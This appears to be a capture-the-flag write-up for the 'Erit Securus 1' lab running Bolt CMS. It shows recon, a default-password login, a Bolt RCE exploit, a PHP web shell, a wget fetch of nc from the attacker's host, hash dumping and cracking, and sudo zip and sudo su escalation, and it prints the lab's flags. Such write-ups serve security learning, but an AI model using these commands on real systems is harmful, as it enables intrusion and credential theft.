> Eris Securus | Bolt CMS

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.6.2
|_http-generator: Bolt
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Graece donan, Latine voluptatem vocant. | Erit Securus 1
```

And we got Bolt CMS. And we have an python exploit in searchsploit. But we require an username password and the URL. Looking at the exploit we can see that the path is `/bolt/login` and let's ty basic password as `admin`:`password`. And yep we can login!

Let's run the exploit to get a shell. The 1'st attempt failed but trying again we can execute OS commands.

python3 exploit.py http://10.10.160.217 admin password

```
[+] Retrieving CSRF token to submit the login form
[+] Login token is : o_RU25jNsi9BSSHCD5k-9MP19pDimRx2I5BHvXhsC9I
[+] SESSION INJECTION 
[+] FOUND  : test5
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
[-] Not found.
Enter OS command , for exit 'quit' : id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
";s:8:"*stack";a:0:{}s:10:"*enabled";i:1;s:17:"*shadowpassword";N;s:14:"*shadowtoken";N;s:17:"*shadowvalidity";N;s:15:"*failedlogins";i:0;s:17:"*throttleduntil";N;s:8:"*roles";a:2:{i:0;s:4:"root";i:1;s:8:"everyone";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:8:"*token";O:29:"Bolt\Storage\Entity\Authtoken":12:{s:5:"*id";s:1:"3";s:10:"*user_id";i:1;s:8:"*token";s:64:"34e3f69a6fc2261d519381fba1f6b235abc31e4c27f7df4e2559812eaadd53fc";s:7:"*salt";s:32:"d34f9accf4805f6d1eb98f5d698722af";s:11:"*lastseen";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-04-25 12:32:10.117842";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:5:"*ip";s:10:"172.17.0.1";s:12:"*useragent";s:22:"python-requests/2.23.0";s:11:"*validity";O:13:"Carbon\Carbon":3:{s:4:"date";s:26:"2020-05-09 12:32:10.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:7:"_fields";a:0:{}s:42:"Bolt\Storage\Entity\Entity_specialFields";a:2:{i:0;s:3:"app";i:1;s:6:"values";}s:7:"*_app";N;s:12:"*_internal";a:1:{i:0;s:11:"contenttype";}}s:10:"*checked";i:1587817930;}s:10:"_csrf/bolt";s:43:"Ji6slP_bySLAwmXIDIFpSa6VSGpYwnW2c-2Ik5nEcy0";s:5:"stack";a:0:{}s:18:"_csrf/user_profile";s:43:"lDGl_6zEExwY5SW63TUC0BS-v9JHoXhm9HeVpfFglDc";}s:12:"_sf2_flashes";a:0:{}s:9:"_sf2_meta";a:3:{s:1:"u";i:1587817932;s:1:"c";i:1587817929;s:1:"l";s:1:"0";}}
```

Let's get a shell.

## Steps

1. Execute `echo '<?php system($_GET["c"]);?>'>c.php` in the exploit
2. Transfer nc binary through python server
3. http://$IP/files/cmd.php?c=wget http://10.8.107.21:8000/nc
4. http://$IP/files/cmd.php?c=chmod 755 nc
5. And we got a shell as www-data.

# Privilege Escalation

And in `/var/www/html/app/database` we get the database `bolt.db`.

sqlite3 bolt.db 

.tables

```
bolt_authtoken          bolt_field_value        bolt_pages            
bolt_blocks             bolt_homepage           bolt_relations        
bolt_content_changelog  bolt_log                bolt_showcases        
bolt_cron               bolt_log_change         bolt_taxonomy         
bolt_entries            bolt_log_system         bolt_users            
```

SELECT * FROM bolt_users;

```
1|admin|$2y$10$rIL5OX9ezAEUiD/fWBj2aeXfwZhjFZ5JpYZyJ0NSim/QU6l1.hAze||0|a@a.com|2021-05-14 06:17:43|192.168.100.1|[]|1|||||["root","everyone"]
2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
```

We already know admin's password and we got some other IP too. Let's crack wildone's password using John.

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

```
snickers         (?)
```

We are in Wileec. Wow he's got .ssh directory.

# Flag 1

```
THM{Hey!_Welcome_in}
```

Let's try logging into the another IP from the reverse shell! 

ssh wileec@192.168.100.1

# Priv Esc

sudo -l

```
(jsmith) NOPASSWD: /usr/bin/zip
```

Looking at GTFO we got a hit.

```
TF=$(mktemp -u)
sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
sudo -u jsmith rm $TF
```

And we are in as jsmith. 

# Flag 2

```
THM{Welcome_Home_Wile_E_Coyote!}
```

# Root Priv Esc

sudo -l

```
Matching Defaults entries for jsmith on Securus:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jsmith may run the following commands on Securus:
    (ALL : ALL) NOPASSWD: ALL
```

sudo su -> And we are root!

# Flag 3

```
THM{Great_work!_You_pwned_Erit_Securus_1!}
```